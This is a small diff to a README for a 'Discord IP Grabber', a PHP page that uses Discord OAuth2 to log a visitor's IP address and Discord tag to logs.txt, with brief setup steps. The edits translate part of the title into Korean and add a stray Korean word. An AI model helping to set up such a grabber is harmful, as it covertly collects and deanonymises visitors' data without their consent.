@@ -1,4 +1,4 @@
-# Discord IP Grabber
+# Discord IP 따기
 Grabs a users IP and Discord Tag after visiting a web page using Discords oauth2
 
 # How To Use
@@ -8,3 +8,4 @@ Grabs a users IP and Discord Tag after visiting a web page using Discords oauth2
   4.  Grab the Client ID and the Client Secret and enter it in the .php file
   
 Make sure to create a new file called logs.txt in the same directory 
+등대
